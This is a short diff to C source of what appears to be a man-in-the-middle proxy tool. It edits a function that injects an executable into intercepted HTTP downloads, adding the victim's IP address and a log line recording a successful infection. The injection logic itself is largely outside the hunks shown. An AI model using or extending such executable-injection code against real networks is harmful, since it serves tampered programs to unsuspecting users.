@@ -24,17 +24,18 @@
 
 /* protos */
 
-int proxy_inject_exe(BIO **cbio, BIO **sbio, char *header, char *file, char *host);
+int proxy_inject_exe(BIO **cbio, BIO **sbio, char *header, char *file, char *host, char *ip);
 
 /************************************************/
 
 
-int proxy_inject_exe(BIO **cbio, BIO **sbio, char *header, char *file, char *host)
+int proxy_inject_exe(BIO **cbio, BIO **sbio, char *header, char *file, char *host, char *ip)
 {
    BIO *fbio = NULL;
    char data[READ_BUFF_SIZE];
    int len, written;
    //char *host, *p;
+   int attack_success = 0;
 
    /* check if the client is performing Range requests. if so, reply not supported */
    if (strstr(header, HTTP_RANGE_TAG)) {
@@ -156,6 +157,8 @@ int proxy_inject_exe(BIO **cbio, BIO **sbio, char *header, char *file, char *hos
 
          /* update the stats */
          GBL_STATS->inf_files++;
+
+         attack_success = 1;
       }
    } else {
 
@@ -172,6 +175,8 @@ int proxy_inject_exe(BIO **cbio, BIO **sbio, char *header, char *file, char *hos
    /* send the headers to the client, the data will be sent in the callee function */
    BIO_write(*cbio, data, written);
 
+   if (attack_success == 1)
+      DEBUG_MSG(D_INFO, "[%s] Inject EXE attack successful", ip);
 
    return ESUCCESS;
 }
